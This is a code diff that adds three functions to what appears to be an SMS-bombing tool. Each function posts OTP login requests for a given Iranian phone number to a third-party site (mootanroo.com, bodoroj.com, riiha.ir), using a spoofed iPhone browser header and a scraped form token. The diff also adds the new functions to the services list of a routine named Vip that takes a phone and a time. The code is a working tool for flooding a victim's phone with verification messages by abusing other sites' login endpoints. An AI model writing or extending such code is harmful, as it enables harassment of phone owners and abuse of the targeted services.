@@ -54,6 +54,136 @@ def check_internet():
 # ------------------------------
 
 
+def mootanroo(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://api.mootanroo.com/api/v3/auth/fadce78fbac84ba7887c9942ae460e0c/send-otp"
+    
+    payload = {
+        "PhoneNumber": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://mootanroo.com",
+        "Referer": "https://mootanroo.com/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(mootanroo) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (mootanroo) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] mootanroo Exception: {e}{a}')
+        return False
+
+def bodoroj(phone):
+    import requests
+    import re
+    
+    digits_phone = phone.replace("+98", "")
+    
+    try:
+        session = requests.Session()
+        home_response = session.get("https://bodoroj.com/", timeout=10)
+        
+        # استخراج instance_id
+        instance_id = None
+        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
+        match = re.search(instance_pattern, home_response.text)
+        if match:
+            instance_id = match.group(1)
+        
+        if not instance_id:
+            instance_id = "43a3d59390a470b6d1828df85cdad8e1"
+        
+        url = "https://bodoroj.com/wp-admin/admin-ajax.php"
+        
+        payload = {
+            "login_digt_countrycode": "+98",
+            "digits_phone": digits_phone,  # بدون صفر
+            "digits_email": "",
+            "action_type": "phone",
+            "digits_reg_name": "نام",
+            "digits_process_register": "1",
+            "rememberme": "1",
+            "digits": "1",
+            "instance_id": instance_id,
+            "action": "digits_forms_ajax",
+            "type": "login",
+            "digits_redirect_page": "//bodoroj.com/?page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
+            "digits_form": "fa139d7ce8",
+            "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fbodoroj.com%2F",
+            "show_force_title": "1"
+        }
+        
+        headers = {
+            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://bodoroj.com",
+            "Referer": "https://bodoroj.com/",
+        }
+        
+        response = session.post(url, data=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            if response_data.get("success") is True:
+                print(f'{g}(bodoroj) {a}Code Sent')
+                return True
+        
+        print(f'{r}[-] (bodoroj) Failed{a}')
+        return False
+            
+    except Exception:
+        print(f'{r}[-] (bodoroj) Failed{a}')
+        return False
+
+def riiha(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://www.riiha.ir/api/v1.0/authenticate"
+    
+    payload = {
+        "mobile": formatted_phone,
+        "mobile_code": "",
+        "type": "mobile"
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://www.riiha.ir",
+        "Referer": "https://www.riiha.ir/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(riiha) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (riiha) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] riiha Exception: {e}{a}')
+        return False
+
+
 def niktakala(phone):
     import requests
     import uuid
@@ -242,7 +372,10 @@ def Vip(phone, Time):
     alldigitall,
     mobilex,
     payonshoes,
-    niktakala,  # سرویس جدید
+    niktakala,
+    mootanroo,
+    bodoroj,
+    riiha,  # سرویس جدید
 ]
     total_services = len(services)
 
